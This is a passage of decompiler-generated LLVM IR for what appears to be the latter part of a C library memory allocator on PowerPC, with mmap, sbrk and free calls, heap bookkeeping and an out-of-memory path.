  store i1 %v3_1000b60c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b60c, label %dec_label_pc_1000b614, label %dec_label_pc_1000b878

dec_label_pc_1000b614:                            ; preds = %dec_label_pc_1000b60c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_1000b618, i32* %r4.global-to-local, align 4
  store i32 3, i32* %r5.global-to-local, align 4
  store i32 34, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 268482096, i32* @lr, align 4
  %v6_1000b62c = call i32 @mmap(i32 0, i32 %v0_1000b618, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1000b62c, i32* %r3.global-to-local, align 4
  %v2_1000b630 = icmp sgt i32 %v6_1000b62c, -1
  %v3_1000b630 = icmp eq i32 %v6_1000b62c, -1
  store i1 %v2_1000b630, i1* %cr7_gt.global-to-local, align 1
  store i32 %v6_1000b62c, i32* @r29, align 4
  br i1 %v3_1000b630, label %dec_label_pc_1000b650, label %dec_label_pc_1000b63c

dec_label_pc_1000b63c:                            ; preds = %dec_label_pc_1000b614
  %v3_1000b63c = load i32, i32* @global_var_10023d8c.500, align 4
  store i32 %v3_1000b63c, i32* %r0.global-to-local, align 4
  %v1_1000b640 = load i32, i32* @r30, align 4
  %v2_1000b640 = add i32 %v1_1000b640, %v6_1000b62c
  store i32 %v2_1000b640, i32* %r3.global-to-local, align 4
  %v1_1000b644 = call i32 @__asm_rlwinm(i32 %v3_1000b63c, i32 0, i32 0, i32 30)
  store i32 %v1_1000b644, i32* %r0.global-to-local, align 4
  store i32 %v1_1000b644, i32* @global_var_10023d8c.500, align 4
  %v0_1000b654.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b654

dec_label_pc_1000b650:                            ; preds = %dec_label_pc_1000b5c4, %dec_label_pc_1000b614
  %v0_1000b65463 = phi i32 [ %v1_1000b5c8, %dec_label_pc_1000b5c4 ], [ -1, %dec_label_pc_1000b614 ]
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b654

dec_label_pc_1000b654:                            ; preds = %dec_label_pc_1000b63c, %dec_label_pc_1000b650
  %v0_1000b6b0 = phi i32 [ %v0_1000b654.pre, %dec_label_pc_1000b63c ], [ %v0_1000b65463, %dec_label_pc_1000b650 ]
  %v2_1000b654 = icmp sgt i32 %v0_1000b6b0, -1
  %v3_1000b654 = icmp eq i32 %v0_1000b6b0, -1
  store i1 %v2_1000b654, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b654, label %dec_label_pc_1000b878, label %dec_label_pc_1000b65c

dec_label_pc_1000b65c:                            ; preds = %dec_label_pc_1000b654
  %v0_1000b65c = load i32, i32* @r22, align 4
  %v2_1000b65c = add i32 %v0_1000b65c, %v1_1000b5a0
  store i32 %v2_1000b65c, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b668 = icmp sgt i32 %v0_1000b6b0, %v2_1000b65c
  %v4_1000b668 = icmp eq i32 %v0_1000b6b0, %v2_1000b65c
  store i1 %v3_1000b668, i1* %cr7_gt.global-to-local, align 1
  %v3_1000b66c = load i32, i32* @global_var_10023d94.498, align 4
  %v0_1000b670 = load i32, i32* @r30, align 4
  %v2_1000b670 = add i32 %v0_1000b670, %v3_1000b66c
  store i32 %v2_1000b670, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b670, i32* @global_var_10023d94.498, align 4
  br i1 %v4_1000b668, label %dec_label_pc_1000b67c, label %dec_label_pc_1000b694

dec_label_pc_1000b67c:                            ; preds = %dec_label_pc_1000b65c
  %v0_1000b67c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000b67c = icmp sgt i32 %v0_1000b67c, -1
  %v3_1000b67c = icmp eq i32 %v0_1000b67c, -1
  store i1 %v2_1000b67c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b67c, label %dec_label_pc_1000b684, label %dec_label_pc_1000b694

dec_label_pc_1000b684:                            ; preds = %dec_label_pc_1000b67c
  %v2_1000b684 = add i32 %v0_1000b670, %v1_1000b5a0
  %v1_1000b688 = or i32 %v2_1000b684, 1
  store i32 %v1_1000b688, i32* %r0.global-to-local, align 4
  %v2_1000b68c = add i32 %v0_1000b65c, 4
  %v3_1000b68c = inttoptr i32 %v2_1000b68c to i32*
  store i32 %v1_1000b688, i32* %v3_1000b68c, align 4
  br label %dec_label_pc_1000b80c

dec_label_pc_1000b694:                            ; preds = %dec_label_pc_1000b67c, %dec_label_pc_1000b65c
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b69c = load i32, i32* @global_var_10023d8c.500, align 4
  store i32 %v3_1000b69c, i32* %r0.global-to-local, align 4
  %v1_1000b6a0 = urem i32 %v3_1000b69c, 2
  store i32 %v1_1000b6a0, i32* %r10.global-to-local, align 4
  %v3_1000b6a0 = icmp eq i32 %v1_1000b6a0, 0
  store i1 %v3_1000b6a0, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b6a0, label %dec_label_pc_1000b6c0, label %dec_label_pc_1000b6a8

dec_label_pc_1000b6a8:                            ; preds = %dec_label_pc_1000b694
  %v2_1000b6a8 = icmp sgt i32 %v1_1000b5a0, 0
  %v3_1000b6a8 = icmp eq i32 %v1_1000b5a0, 0
  store i1 %v2_1000b6a8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b6a8, label %dec_label_pc_1000b6c0, label %dec_label_pc_1000b6b0

dec_label_pc_1000b6b0:                            ; preds = %dec_label_pc_1000b6a8
  %v2_1000b6b0 = icmp ult i32 %v0_1000b6b0, %v2_1000b65c
  %v3_1000b6b0 = icmp ugt i32 %v0_1000b6b0, %v2_1000b65c
  store i1 %v3_1000b6b0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b6b0, label %dec_label_pc_1000b6b8, label %dec_label_pc_1000b6c0

dec_label_pc_1000b6b8:                            ; preds = %dec_label_pc_1000b6b0
  %v1_1000b6b8 = call i32 @__asm_rlwinm(i32 %v3_1000b69c, i32 0, i32 0, i32 30)
  store i32 %v1_1000b6b8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000b6b8, i32* @global_var_10023d8c.500, align 4
  br label %dec_label_pc_1000b6c0

dec_label_pc_1000b6c0:                            ; preds = %dec_label_pc_1000b6b0, %dec_label_pc_1000b6a8, %dec_label_pc_1000b694, %dec_label_pc_1000b6b8
  %v3_1000b6c8 = phi i32 [ %v3_1000b69c, %dec_label_pc_1000b6b0 ], [ %v3_1000b69c, %dec_label_pc_1000b6a8 ], [ %v3_1000b69c, %dec_label_pc_1000b694 ], [ %v1_1000b6b8, %dec_label_pc_1000b6b8 ]
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r27, align 4
  store i32 %v3_1000b6c8, i32* %r0.global-to-local, align 4
  %v1_1000b6cc = urem i32 %v3_1000b6c8, 2
  store i32 %v1_1000b6cc, i32* %r9.global-to-local, align 4
  %v3_1000b6cc = icmp eq i32 %v1_1000b6cc, 0
  store i1 %v3_1000b6cc, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b6cc, label %dec_label_pc_1000b768, label %dec_label_pc_1000b6d4

dec_label_pc_1000b6d4:                            ; preds = %dec_label_pc_1000b6c0
  %v2_1000b6d4 = icmp sgt i32 %v1_1000b5a0, 0
  %v3_1000b6d4 = icmp eq i32 %v1_1000b5a0, 0
  store i1 %v2_1000b6d4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b6d4, label %dec_label_pc_1000b6d4.dec_label_pc_1000b6ec_crit_edge, label %dec_label_pc_1000b6dc

dec_label_pc_1000b6d4.dec_label_pc_1000b6ec_crit_edge: ; preds = %dec_label_pc_1000b6d4
  %v0_1000b6ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b6dc:                            ; preds = %dec_label_pc_1000b6d4
  %v3_1000b6dc = load i32, i32* @global_var_10023d94.498, align 4
  store i32 %v3_1000b6dc, i32* %r9.global-to-local, align 4
  %v0_1000b6e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b6e0 = load i32, i32* @r29, align 4
  %v2_1000b6e0 = sub i32 %v1_1000b6e0, %v0_1000b6e0
  %v2_1000b6e4 = add i32 %v2_1000b6e0, %v3_1000b6dc
  store i32 %v2_1000b6e4, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b6e4, i32* @global_var_10023d94.498, align 4
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b6ec:                            ; preds = %dec_label_pc_1000b6d4.dec_label_pc_1000b6ec_crit_edge, %dec_label_pc_1000b6dc
  %v0_1000b708 = phi i32 [ %v0_1000b6ec.pre, %dec_label_pc_1000b6d4.dec_label_pc_1000b6ec_crit_edge ], [ %v1_1000b6e0, %dec_label_pc_1000b6dc ]
  %v1_1000b6ec = urem i32 %v0_1000b708, 8
  store i32 %v1_1000b6ec, i32* %r0.global-to-local, align 4
  %v3_1000b6ec = icmp eq i32 %v1_1000b6ec, 0
  store i1 %v3_1000b6ec, i1* %cr0_eq.global-to-local, align 1
  store i32 %v0_1000b708, i32* @r28, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br i1 %v3_1000b6ec, label %dec_label_pc_1000b704, label %dec_label_pc_1000b6fc

dec_label_pc_1000b6fc:                            ; preds = %dec_label_pc_1000b6ec
  %v1_1000b6fc = sub nsw i32 8, %v1_1000b6ec
  store i32 %v1_1000b6fc, i32* %r9.global-to-local, align 4
  %v2_1000b700 = add i32 %v1_1000b6fc, %v0_1000b708
  store i32 %v2_1000b700, i32* @r28, align 4
  br label %dec_label_pc_1000b704

dec_label_pc_1000b704:                            ; preds = %dec_label_pc_1000b6ec, %dec_label_pc_1000b6fc
  %v0_1000b704 = phi i32 [ 0, %dec_label_pc_1000b6ec ], [ %v1_1000b6fc, %dec_label_pc_1000b6fc ]
  %v2_1000b704 = add i32 %v0_1000b704, %v1_1000b5a0
  %v1_1000b708 = load i32, i32* @r30, align 4
  %v2_1000b708 = add i32 %v1_1000b708, %v0_1000b708
  store i32 %v2_1000b708, i32* %r30.global-to-local, align 4
  %v2_1000b70c = add i32 %v2_1000b704, %v2_1000b708
  store i32 %v2_1000b70c, i32* %r11.global-to-local, align 4
  %v1_1000b710 = load i32, i32* @r24, align 4
  %v2_1000b710 = add i32 %v1_1000b710, %v2_1000b70c
  %v2_1000b714 = sub i32 0, %v2_1000b708
  store i32 %v2_1000b714, i32* %r9.global-to-local, align 4
  %v1_1000b718 = load i32, i32* @r23, align 4
  %v2_1000b718 = and i32 %v1_1000b718, %v2_1000b710
  store i32 %v2_1000b718, i32* %r0.global-to-local, align 4
  %v2_1000b71c = sub i32 %v2_1000b718, %v2_1000b708
  store i32 %v2_1000b71c, i32* %r3.global-to-local, align 4
  store i32 268482344, i32* @lr, align 4
  %v1_1000b724 = call i32 @__GI_sbrk(i32 %v2_1000b71c)
  store i32 %v1_1000b724, i32* %r3.global-to-local, align 4
  %v2_1000b728 = icmp sgt i32 %v1_1000b724, -1
  %v3_1000b728 = icmp eq i32 %v1_1000b724, -1
  store i1 %v2_1000b728, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b728, label %dec_label_pc_1000b730, label %dec_label_pc_1000b740

dec_label_pc_1000b730:                            ; preds = %dec_label_pc_1000b704
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b73c.502 to i32), i32* @lr, align 4
  %v1_1000b738 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1000b738, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b794

dec_label_pc_1000b740:                            ; preds = %dec_label_pc_1000b704
  %v1_1000b740 = load i32, i32* @r29, align 4
  %v2_1000b740 = icmp ult i32 %v1_1000b724, %v1_1000b740
  %v3_1000b740 = icmp ugt i32 %v1_1000b724, %v1_1000b740
  store i1 %v3_1000b740, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b740, label %dec_label_pc_1000b748, label %dec_label_pc_1000b794.thread

dec_label_pc_1000b748:                            ; preds = %dec_label_pc_1000b740
  %v0_1000b74c = load i32, i32* @r30, align 4
  store i32 %v0_1000b74c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v3_1000b758 = load i32, i32* @global_var_10023d8c.500, align 4
  store i32 %v3_1000b758, i32* %r0.global-to-local, align 4
  %v1_1000b75c = call i32 @__asm_rlwinm(i32 %v3_1000b758, i32 0, i32 0, i32 30)
  store i32 %v1_1000b75c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000b75c, i32* @global_var_10023d8c.500, align 4
  %v0_1000b794.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b794

dec_label_pc_1000b768:                            ; preds = %dec_label_pc_1000b6c0
  %v0_1000b768 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000b768 = icmp sgt i32 %v0_1000b768, -1
  %v3_1000b768 = icmp eq i32 %v0_1000b768, -1
  store i1 %v2_1000b768, i1* %cr7_gt.global-to-local, align 1
  %v0_1000b76c = load i32, i32* @r29, align 4
  store i32 %v0_1000b76c, i32* @r28, align 4
  store i32 0, i32* @r31, align 4
  br i1 %v3_1000b768, label %dec_label_pc_1000b778, label %dec_label_pc_1000b794.thread

dec_label_pc_1000b778:                            ; preds = %dec_label_pc_1000b768
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268482432, i32* @lr, align 4
  %v1_1000b77c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1000b77c, i32* %r3.global-to-local, align 4
  %v3_1000b780 = load i32, i32* @global_var_10023d94.498, align 4
  store i32 %v3_1000b780, i32* %r9.global-to-local, align 4
  %v0_1000b784 = load i32, i32* @r29, align 4
  %v0_1000b788 = load i32, i32* @r30, align 4
  %v2_1000b784 = add i32 %v3_1000b780, %v1_1000b77c
  %v2_1000b788 = sub i32 %v2_1000b784, %v0_1000b784
  %v2_1000b78c = sub i32 %v2_1000b788, %v0_1000b788
  store i32 %v2_1000b78c, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b78c, i32* @global_var_10023d94.498, align 4
  br label %dec_label_pc_1000b794

dec_label_pc_1000b794.thread:                     ; preds = %dec_label_pc_1000b740, %dec_label_pc_1000b768
  %v0_1000b79c.ph = phi i32 [ %v0_1000b768, %dec_label_pc_1000b768 ], [ %v1_1000b724, %dec_label_pc_1000b740 ]
  %v2_1000b79469 = icmp sgt i32 %v0_1000b79c.ph, -1
  store i1 %v2_1000b79469, i1* %cr7_gt.global-to-local, align 1
  br label %dec_label_pc_1000b79c

dec_label_pc_1000b794:                            ; preds = %dec_label_pc_1000b748, %dec_label_pc_1000b778, %dec_label_pc_1000b730
  %v0_1000b79c = phi i32 [ %v1_1000b738, %dec_label_pc_1000b730 ], [ %v1_1000b77c, %dec_label_pc_1000b778 ], [ %v0_1000b794.pr.pre, %dec_label_pc_1000b748 ]
  %v2_1000b794 = icmp sgt i32 %v0_1000b79c, -1
  %v3_1000b794 = icmp eq i32 %v0_1000b79c, -1
  store i1 %v2_1000b794, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b794, label %dec_label_pc_1000b80c, label %dec_label_pc_1000b79c

dec_label_pc_1000b79c:                            ; preds = %dec_label_pc_1000b794.thread, %dec_label_pc_1000b794
  %v0_1000b79c71 = phi i32 [ %v0_1000b79c.ph, %dec_label_pc_1000b794.thread ], [ %v0_1000b79c, %dec_label_pc_1000b794 ]
  %v1_1000b79c = load i32, i32* @r31, align 4
  %v2_1000b79c = add i32 %v1_1000b79c, %v0_1000b79c71
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000b7a4 = load i32, i32* @r28, align 4
  %v2_1000b7a4 = sub i32 %v2_1000b79c, %v0_1000b7a4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* %r30.global-to-local, align 4
  %v1_1000b7ac = or i32 %v2_1000b7a4, 1
  %v2_1000b7b0 = icmp sgt i32 %v1_1000b5a0, 0
  %v3_1000b7b0 = icmp eq i32 %v1_1000b5a0, 0
  store i1 %v2_1000b7b0, i1* %cr7_gt.global-to-local, align 1
  %v2_1000b7b4 = add i32 %v0_1000b7a4, 4
  %v3_1000b7b4 = inttoptr i32 %v2_1000b7b4 to i32*
  store i32 %v1_1000b7ac, i32* %v3_1000b7b4, align 4
  %v0_1000b7b8 = load i32, i32* @r28, align 4
  store i32 %v0_1000b7b8, i32* @global_var_10023a58.487, align 4
  %v3_1000b7bc = load i32, i32* @global_var_10023d94.498, align 4
  %v0_1000b7c0 = load i32, i32* @r31, align 4
  %v2_1000b7c0 = add i32 %v0_1000b7c0, %v3_1000b7bc
  store i32 %v2_1000b7c0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b7c0, i32* @global_var_10023d94.498, align 4
  br i1 %v3_1000b7b0, label %dec_label_pc_1000b80c, label %dec_label_pc_1000b7cc

dec_label_pc_1000b7cc:                            ; preds = %dec_label_pc_1000b79c
  %v1_1000b7cc = add i32 %v1_1000b5a0, -12
  store i32 %v1_1000b7cc, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_1000b7d4 = call i32 @__asm_rlwinm(i32 %v1_1000b7cc, i32 0, i32 0, i32 28)
  %v2_1000b7d8 = icmp ugt i32 %v1_1000b7d4, 15
  store i1 %v2_1000b7d8, i1* %cr7_gt.global-to-local, align 1
  %v0_1000b7dc = load i32, i32* @r22, align 4
  %v2_1000b7dc = add i32 %v0_1000b7dc, %v1_1000b7d4
  store i32 %v2_1000b7dc, i32* %r11.global-to-local, align 4
  %v1_1000b7e0 = or i32 %v1_1000b7d4, 1
  store i32 %v1_1000b7e0, i32* %r0.global-to-local, align 4
  %v2_1000b7e4 = add i32 %v0_1000b7dc, 4
  %v3_1000b7e4 = inttoptr i32 %v2_1000b7e4 to i32*
  store i32 %v1_1000b7e0, i32* %v3_1000b7e4, align 4
  %v0_1000b7e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b7e8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b7e8 = add i32 %v1_1000b7e8, 8
  %v3_1000b7e8 = inttoptr i32 %v2_1000b7e8 to i32*
  store i32 %v0_1000b7e8, i32* %v3_1000b7e8, align 4
  %v0_1000b7ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b7ec = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b7ec = add i32 %v1_1000b7ec, 4
  %v3_1000b7ec = inttoptr i32 %v2_1000b7ec to i32*
  store i32 %v0_1000b7ec, i32* %v3_1000b7ec, align 4
  %tmp82 = icmp ult i32 %v1_1000b7d4, 16
  br i1 %tmp82, label %dec_label_pc_1000b80c, label %dec_label_pc_1000b7f4

dec_label_pc_1000b7f4:                            ; preds = %dec_label_pc_1000b7cc
  store i32 -1, i32* %r0.global-to-local, align 4
  %v3_1000b7f8 = load i32, i32* @global_var_10023d70.503, align 4
  store i32 %v3_1000b7f8, i32* @r29, align 4
  store i32 -1, i32* @global_var_10023d70.503, align 4
  %v0_1000b800 = load i32, i32* @r22, align 4
  %v1_1000b800 = add i32 %v0_1000b800, 8
  store i32 %v1_1000b800, i32* @r3, align 4
  store i32 268482568, i32* @lr, align 4
  %v0_1000b804 = call i32 @free()
  store i32 %v0_1000b804, i32* %r3.global-to-local, align 4
  %v0_1000b808 = load i32, i32* @r29, align 4
  store i32 %v0_1000b808, i32* @global_var_10023d70.503, align 4
  br label %dec_label_pc_1000b80c

dec_label_pc_1000b80c:                            ; preds = %dec_label_pc_1000b7cc, %dec_label_pc_1000b79c, %dec_label_pc_1000b794, %dec_label_pc_1000b684, %dec_label_pc_1000b7f4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r8, align 4
  %v3_1000b814 = load i32, i32* @global_var_10023d94.498, align 4
  store i32 %v3_1000b814, i32* @r11, align 4
  %v3_1000b818 = load i32, i32* @global_var_10023d98.504, align 4
  store i32 %v3_1000b818, i32* %r0.global-to-local, align 4
  %v3_1000b81c = icmp ugt i32 %v3_1000b814, %v3_1000b818
  store i1 %v3_1000b81c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b81c, label %dec_label_pc_1000b824, label %dec_label_pc_1000b828

dec_label_pc_1000b824:                            ; preds = %dec_label_pc_1000b80c
  store i32 %v3_1000b814, i32* @global_var_10023d98.504, align 4
  br label %dec_label_pc_1000b828

dec_label_pc_1000b828:                            ; preds = %dec_label_pc_1000b80c, %dec_label_pc_1000b824
  %v3_1000b828 = load i32, i32* @global_var_10023d90.496, align 4
  %v3_1000b82c = load i32, i32* @global_var_10023da0.499, align 4
  store i32 %v3_1000b82c, i32* %r9.global-to-local, align 4
  %v2_1000b830 = add i32 %v3_1000b828, %v3_1000b814
  store i32 %v2_1000b830, i32* %r0.global-to-local, align 4
  %v3_1000b834 = icmp ugt i32 %v2_1000b830, %v3_1000b82c
  store i1 %v3_1000b834, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b834, label %dec_label_pc_1000b83c, label %dec_label_pc_1000b840

dec_label_pc_1000b83c:                            ; preds = %dec_label_pc_1000b828
  store i32 %v2_1000b830, i32* @global_var_10023da0.499, align 4
  br label %dec_label_pc_1000b840

dec_label_pc_1000b840:                            ; preds = %dec_label_pc_1000b828, %dec_label_pc_1000b83c
  %v3_1000b840 = load i32, i32* @global_var_10023a58.487, align 4
  store i32 %v3_1000b840, i32* %r10.global-to-local, align 4
  %v1_1000b844 = add i32 %v3_1000b840, 4
  %v2_1000b844 = inttoptr i32 %v1_1000b844 to i32*
  %v3_1000b844 = load i32, i32* %v2_1000b844, align 4
  store i32 %v3_1000b844, i32* %r0.global-to-local, align 4
  %v1_1000b848 = call i32 @__asm_rlwinm(i32 %v3_1000b844, i32 0, i32 0, i32 29)
  store i32 %v1_1000b848, i32* %r0.global-to-local, align 4
  %v1_1000b84c = load i32, i32* @r21, align 4
  %v2_1000b84c = icmp ult i32 %v1_1000b848, %v1_1000b84c
  %v3_1000b84c = icmp ugt i32 %v1_1000b848, %v1_1000b84c
  store i1 %v3_1000b84c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b84c, label %dec_label_pc_1000b878, label %dec_label_pc_1000b854

dec_label_pc_1000b854:                            ; preds = %dec_label_pc_1000b840
  %v0_1000b854 = load i32, i32* @r26, align 4
  %v2_1000b854 = sub i32 %v1_1000b848, %v0_1000b854
  %v0_1000b858 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b858 = add i32 %v0_1000b858, %v0_1000b854
  store i32 %v2_1000b858, i32* @r11, align 4
  %v1_1000b85c = or i32 %v2_1000b854, 1
  store i32 %v1_1000b85c, i32* %r0.global-to-local, align 4
  %v1_1000b860 = or i32 %v0_1000b854, 1
  store i32 %v1_1000b860, i32* %r9.global-to-local, align 4
  %v1_1000b864 = add i32 %v0_1000b858, 8
  store i32 %v1_1000b864, i32* %r3.global-to-local, align 4
  %v2_1000b868 = add i32 %v0_1000b858, 4
  %v3_1000b868 = inttoptr i32 %v2_1000b868 to i32*
  store i32 %v1_1000b860, i32* %v3_1000b868, align 4
  %v0_1000b86c = load i32, i32* @r11, align 4
  store i32 %v0_1000b86c, i32* @global_var_10023a58.487, align 4
  %v0_1000b870 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b870 = add i32 %v0_1000b86c, 4
  %v3_1000b870 = inttoptr i32 %v2_1000b870 to i32*
  store i32 %v0_1000b870, i32* %v3_1000b870, align 4
  br label %dec_label_pc_1000b894

dec_label_pc_1000b878:                            ; preds = %dec_label_pc_1000b60c, %dec_label_pc_1000b840, %dec_label_pc_1000b654
  store i32 12, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1000b888 = load i32, i32* @r2, align 4
  %v1_1000b88c = add i32 %v0_1000b888, -28672
  store i32 %v1_1000b88c, i32* %r9.global-to-local, align 4
  %v2_1000b890 = inttoptr i32 %v1_1000b88c to i32*
  store i32 12, i32* %v2_1000b890, align 4
  br label %dec_label_pc_1000b894

dec_label_pc_1000b894:                            ; preds = %dec_label_pc_1000b854, %dec_label_pc_1000b574, %dec_label_pc_1000b484, %dec_label_pc_1000b878
  %v0_1000b894 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000b894, i32* @r30, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b898:                            ; preds = %dec_label_pc_1000b450, %dec_label_pc_1000b414, %dec_label_pc_1000b2b8, %dec_label_pc_1000b2ac, %dec_label_pc_1000b114, %dec_label_pc_1000b09c, %dec_label_pc_1000b064, %dec_label_pc_1000b894
  store i32 %v2_1000afd0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 268482724, i32* @lr, align 4
  %v3_1000b8a0 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-72, i32 1)
  store i32 %v3_1000b8a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b8a4

dec_label_pc_1000b8a4:                            ; preds = %dec_label_pc_1000aff0, %dec_label_pc_1000b898
  store i32 %v0_1000afb0, i32* %r0.global-to-local, align 4
  %v0_1000b8a8 = load i32, i32* @r30, align 4
  store i32 %v0_1000b8a8, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b8a8

; uselistorder directives
  uselistorder i32 %v0_1000b858, { 2, 1, 0 }
  uselistorder i32 %v0_1000b854, { 1, 0, 2 }
  uselistorder i32 %v1_1000b848, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000b7dc, { 1, 0 }
  uselistorder i32 %v1_1000b7d4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1000b7a4, { 1, 0 }
  uselistorder i32 %v0_1000b79c, { 0, 2, 1 }
  uselistorder i32 %v2_1000b78c, { 1, 0 }
  uselistorder i32 %v1_1000b77c, { 1, 0, 2 }
  uselistorder i32 %v1_1000b724, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_1000b71c, { 1, 0 }
  uselistorder i32 %v2_1000b708, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000b6fc, { 1, 0, 2 }
  uselistorder i32 %v1_1000b6ec, { 2, 1, 0 }
  uselistorder i32 %v0_1000b708, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1000b6cc, { 1, 0 }
  uselistorder i32 %v1_1000b6a0, { 1, 0 }
  uselistorder i32 %v3_1000b69c, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_1000b65c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_1000b65c, { 1, 0 }
  uselistorder i32 %v0_1000b6b0, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v6_1000b62c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000b618, { 1, 0, 2 }
  uselistorder i32 %v1_1000b5e4, { 1, 0 }
  uselistorder i32 %v1_1000b5c8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1000b5b8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v1_1000b5b4, { 1, 0 }
  uselistorder i32 %v1_1000b5a0, { 11, 10, 9, 0, 8, 7, 6, 5, 1, 2, 3, 4, 12 }
  uselistorder i32 %v1_1000b58c, { 1, 0 }
  uselistorder i32 %v1_1000b4f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000b4ec, { 2, 1, 0 }
  uselistorder i32 %v6_1000b4e0, { 2, 4, 3, 1, 0, 6, 5, 7 }
  uselistorder i32 %v3_1000b4bc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000b4a8, { 1, 0, 2 }
  uselistorder i32 %v3_1000b4a4, { 1, 0, 2 }
  uselistorder i32 %v0_1000b49c, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v3_1000b494, { 1, 0, 2 }
  uselistorder i32 %v0_1000b454, { 2, 1, 0 }
  uselistorder i32 %v0_1000b450, { 1, 0, 2 }
  uselistorder i32 %v1_1000b444, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000b424, { 1, 0 }
  uselistorder i32 %v3_1000b3e8, { 1, 0 }
  uselistorder i32 %v2_1000b3e0, { 1, 2, 0 }
  uselistorder i32 %v0_1000b3e0, { 1, 0 }
  uselistorder i32 %v3_1000b398, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000b3b4, { 1, 0 }
  uselistorder i32 %v1_1000b38c, { 3, 2, 1, 0 }
  uselistorder i32 %r0.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1000b38810, { 1, 0 }
  uselistorder i32 %v3_1000b368, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000b35c, { 1, 0 }
  uselistorder i32 %v1_1000b358, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000b334, { 1, 0 }
  uselistorder i32 %v1_1000b32c, { 1, 0 }
  uselistorder i32 %v1_1000b314, { 1, 0 }
  uselistorder i32 %v1_1000b30c, { 1, 0 }
  uselistorder i32 %v1_1000b308, { 1, 0 }
  uselistorder i32 %v1_1000b2f4, { 2, 0, 1 }
  uselistorder i32 %v0_1000b2d4, { 1, 0 }
  uselistorder i32 %v1_1000b2b8, { 1, 0 }
  uselistorder i32 %v0_1000b298, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000b278, { 1, 0, 2 }
  uselistorder i32 %v3_1000b26c, { 1, 0, 2 }
